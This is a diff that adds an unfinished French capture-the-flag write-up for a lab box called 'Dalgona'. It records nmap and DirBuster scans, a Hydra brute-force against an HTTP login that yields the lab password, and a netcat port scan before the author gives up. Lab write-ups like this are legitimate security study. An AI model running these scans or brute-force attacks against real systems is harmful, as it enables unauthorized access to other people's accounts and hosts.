@@ -408,5 +408,98 @@ ssh -i id_rsa user@XXX.XXX.XX.XX -p XXXX
 
 Le port 22 n'est malheureusement pas le port par défaut. Il s'agit en réalité du port 5555.
 
+## WriteUp Dalgona
+
+Un premier scan NMAP nous informe que tous les ports sont ouverts, ce qui rend l'analyse difficile.
+
+```
+Nmap scan report for 10.10.216.69
+Host is up (0.046s latency).
+Not shown: 65461 closed tcp ports (reset)
+PORT      STATE SERVICE           VERSION
+22/tcp    open  ssh               OpenSSH 7.6p1 Ubuntu 4ubuntu0.6 (Ubuntu Linux; protocol 2.0)
+| ssh-hostkey: 
+|   2048 d7:ec:1a:7f:62:74:da:29:64:b3:ce:1e:e2:68:04:f7 (RSA)
+|   256 de:4f:ee:fa:86:2e:fb:bd:4c:dc:f9:67:73:02:84:34 (ECDSA)
+|_  256 e2:6d:8d:e1:a8:d0:bd:97:cb:9a:bc:03:c3:f8:d8:85 (ED25519)
+80/tcp    open  http              Apache httpd 2.4.29 ((Ubuntu))
+|_http-title: Squid Game
+|_http-server-header: Apache/2.4.29 (Ubuntu)
+88/tcp    open  kerberos-sec?
+106/tcp   open  pop3pw?
+194/tcp   open  irc?
+|_irc-info: Unable to open connection
+389/tcp   open  ldap?
+```
+
+Nous nous concentrons donc sur le port 80 afin de récolter des renseignements avec dirbuster.
+```
+DirBuster 1.0-RC1 - Report
+http://www.owasp.org/index.php/Category:OWASP_DirBuster_Project
+Report produced on Mon May 09 04:04:32 EDT 2022
+--------------------------------
+
+http://10.10.48.121:80
+--------------------------------
+Directories found during testing:
+
+Dirs found with a 200 response:
+
+/
+/crack/
+/hack/
+/threat/
+/run/
+/beg/
+/melt/
+/lick/
+
+Dirs found with a 403 response:
+
+/icons/
+/icons/small/
+/server-status/
+
+
+--------------------------------
+--------------------------------
+```
+
+Le répertoire "lick" nous amène sur une page de login.
+Simple intuition sur le username "player456" en référence à la serie, un bruteforce sur le loginform nous valide un mot de passe:
+```
+(kali㉿kali)-[~]
+└─$ hydra -l player456 -P /home/kali/Downloads/rockyou.txt -s 80 -f 10.10.48.121 http-get /lick/ide/
+Hydra v9.2 (c) 2021 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).
+
+Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2022-05-09 05:01:34
+[DATA] max 16 tasks per 1 server, overall 16 tasks, 14344398 login tries (l:1/p:14344398), ~896525 tries per task
+[DATA] attacking http-get://10.10.48.121:80/lick/ide/
+[STATUS] 1772.00 tries/min, 1772 tries in 00:01h, 14342626 to do in 134:55h, 16 active
+[STATUS] 2295.67 tries/min, 6887 tries in 00:03h, 14337511 to do in 104:06h, 16 active
+[80][http-get] host: 10.10.48.121   login: player456   password: sugardaddy
+[STATUS] attack finished for 10.10.48.121 (valid pair found)
+1 of 1 target successfully completed, 1 valid password found
+Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2022-05-09 05:08:17
+```
+ainsi
+username: player456
+password: sugardaddy
+
+Ce qui nous amène sur Codiad.
+
+Et là c'est la galère.
+
+Un autre scan netcat nous confirme le port 22 sur un scan des 100 premiers ports:
+
+```
+┌──(kali㉿kali)-[~]
+└─$ netcat 10.10.154.120 1-100
+SSH-2.0-OpenSSH_7.6p1 Ubuntu-4ubuntu0.6
+```
+
+Mais on a pas su aller plus loin.
+
+
 
 
